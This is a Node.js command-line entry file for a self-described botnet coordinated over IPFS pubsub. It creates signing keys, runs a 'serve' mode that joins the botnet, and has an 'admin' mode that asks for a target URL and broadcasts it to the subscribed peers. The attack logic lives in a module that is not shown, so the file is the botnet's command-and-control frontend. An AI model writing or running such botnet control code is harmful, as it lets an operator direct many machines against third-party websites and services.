import args from 'args';
import pbL, { list_peers, send_next_target } from './pbLogic';
// IPFS topic
const TOPIC = 'btnt-ipfs';
// Create a readline interface
import readline from 'readline';
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
// Load crpto tool tweetna-cl
import nacl from 'tweetnacl';
import naclUtil from 'tweetnacl-util';
// Load fs for key storing
import fs from 'fs';
import { exit } from 'process';

const serveCommand = async () => {
  // Ckeck if key exist
  if(!fs.existsSync('pbkey.key')){
    console.error('Key does not exist...');
    exit(1);
  }
  await pbL(TOPIC);
};

const adminCommand = async () => {
  // Ckeck if key exist
  if(!fs.existsSync('pbkey.key')){
    console.error('Key does not exist...');
    console.log('Please run create command to generate some keys. The botnet must have the same public key.');
    exit(1);
  }
  rl.question('Url to target: ', async (url) => {
    await send_next_target(TOPIC, url);
  });
};
const listPeers = async () => {
  await list_peers(TOPIC);
};
const createKeys = () => {
  console.log('Creating keys');
  // https://github.com/dchest/tweetnacl-js#naclsignkeypair
  const keypair = nacl.sign.keyPair();
  // https://github.com/dchest/tweetnacl-util-js#documentation
  const pbKeyString = naclUtil.encodeBase64(keypair.publicKey);
  const pvKeyString = naclUtil.encodeBase64(keypair.secretKey);
  fs.writeFileSync('pbkey.key', pbKeyString);
  fs.writeFileSync('pvkey.key', pvKeyString);
  console.log('Keys created');
  exit(0);
};

args
  .command('serve', 'Serve the botnet', serveCommand)
  .command('admin', 'Send messages to the pubsub botnet', adminCommand)
  .command('peers', 'List the peers that are subscribed to the topic', listPeers)
  .command('create', 'Create a keys for signing', createKeys);

// Parse cli args 
args.parse(process.argv);
